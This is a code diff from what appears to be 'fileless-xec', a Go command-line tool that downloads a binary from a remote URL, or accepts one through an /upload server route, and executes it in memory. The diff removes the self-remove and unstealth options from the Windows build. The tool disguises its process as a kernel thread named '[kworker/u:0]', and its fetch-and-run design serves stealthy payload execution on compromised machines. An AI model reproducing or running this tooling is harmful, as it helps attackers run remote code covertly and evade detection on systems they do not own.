@@ -19,8 +19,6 @@ func main() {
 	//CMD FILELESS-XEC
 	var name string
 	var http3 bool
-	var selfRm bool
-	var unstealth bool
 
 	var cmdFilelessxec = &cobra.Command{
 		Use:   "fileless-xec [remote_url]",
@@ -43,7 +41,7 @@ func main() {
 				binaryRaw = transport.GetBinaryRaw(url)
 			}
 
-			cfg := &config.Config{BinaryContent: binaryRaw, Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}
+			cfg := &config.Config{BinaryContent: binaryRaw, ArgsExec: argsExec, Environ: environ}
 
 			execwindows.Filelessxec(cfg)
 		},
@@ -62,7 +60,7 @@ func main() {
 			argsExec := []string{name}
 			argsExec = append(argsExec, args[1:]...) //argument if binary execution need them fileless-xec <binary_url> -- <flags> <values>
 			environ := os.Environ()
-			cfg := &config.Config{Unstealth: unstealth, ArgsExec: argsExec, SelfRm: selfRm, Environ: environ}
+			cfg := &config.Config{ArgsExec: argsExec, Environ: environ}
 			// Upload route
 			http.HandleFunc("/upload", serverwindows.UploadAndExecHandler(cfg))
 
@@ -77,9 +75,6 @@ func main() {
 	//flag handling
 	cmdFilelessxec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
 	cmdFilelessxec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
-	cmdFilelessxec.PersistentFlags().BoolVarP(&selfRm, "self-remove", "r", false, "remove fileless-xec while its execution (only on Linux). fileless-xec must be in the same repository that the excution process")
-	cmdFilelessxec.PersistentFlags().BoolVarP(&unstealth, "unstealth", "u", false, "store the file locally on disk before executing it. Not stealth, but useful if your system does not support mem_fd syscall")
-
 	cmdFilelessxec.AddCommand(cmdServer)
 	cmdFilelessxec.Execute()
 }
